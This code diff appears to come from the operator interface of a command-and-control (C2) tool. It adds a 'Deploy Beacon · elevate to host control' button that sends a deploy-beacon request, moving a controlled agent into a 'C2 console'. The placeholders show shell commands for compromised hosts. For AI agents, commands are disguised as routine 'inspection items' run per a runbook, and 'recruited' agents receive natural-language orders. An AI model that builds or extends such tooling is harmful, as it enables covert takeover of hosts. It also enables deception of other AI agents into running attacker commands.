@@ -146,7 +146,10 @@
         <option value="uninstall">{{ _('卸载 Agent') }}</option>
       </select>
       <textarea id="chat-input" placeholder="{{ _('下发巡检项（平台运维语义），例如：uptime; id —— Agent 将按网关 runbook 执行并回传输出') if agent_plane == 'agent' else (_('用自然语言向该 Agent 下达指令，例如：报告当前目录内容与运行身份…') if is_recruited else _('输入要下发的 shell 命令，例如：whoami; uname -a')) }}"></textarea>
-      <button type="button" class="primary" id="btn-send">{{ _('发送指令') }}</button>
+      <button type="button" class="primary" id="btn-send">{{ _('发送巡检项') if agent_plane == 'agent' else _('发送指令') }}</button>
+      {% if agent_plane == 'agent' %}
+      <button type="button" class="secondary" id="btn-deploy-beacon" data-confirm="{{ _('向该 Agent 下发节点代理部署任务，将其提升为主机控制（部署成功后身份自动转入 C2 控制台）？') }}">{{ _('部署 Beacon · 提升为主机控制') }}</button>
+      {% endif %}
     </div>
   </section>
 
@@ -317,7 +320,7 @@
   var timer = null;
 
   var STATUS_LABEL = { queued: '排队', dispatched: '已派发', completed: '完成', failed: '失败' };
-  var TYPE_LABEL = { nl_instruct: '指令', cmd: 'cmd', read_file: '读文件', write_file: '写文件', download: '下载', uninstall: '卸载' };
+  var TYPE_LABEL = { nl_instruct: '指令', cmd: 'cmd', read_file: '读文件', write_file: '写文件', download: '下载', uninstall: '卸载', beacon_deploy: '部署升级' };
 
   function fmtTime(iso) {
     if (!iso) return '';
@@ -427,6 +430,18 @@
   }
 
   btnSend.addEventListener('click', send);
+  var btnBeacon = document.getElementById('btn-deploy-beacon');
+  if (btnBeacon) btnBeacon.addEventListener('click', function () {
+    btnBeacon.disabled = true;
+    fetch('/api/admin/agent-console/' + AGENT_ID + '/deploy-beacon', { method: 'POST', credentials: 'same-origin' })
+      .then(function (r) { return r.json().then(function (d) { return { ok: r.ok, d: d }; }); })
+      .then(function (res) {
+        btnBeacon.disabled = false;
+        if (res.ok) { poll(); input.focus(); }
+        else { alert(res.d && res.d.error === 'already_host_plane'
+          ? '该身份已是主机控制平面' : '下发失败: ' + (res.d && res.d.error || res.d)); }
+      }).catch(function () { btnBeacon.disabled = false; });
+  });
   input.addEventListener('keydown', function (e) {
     if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); send(); }
   });
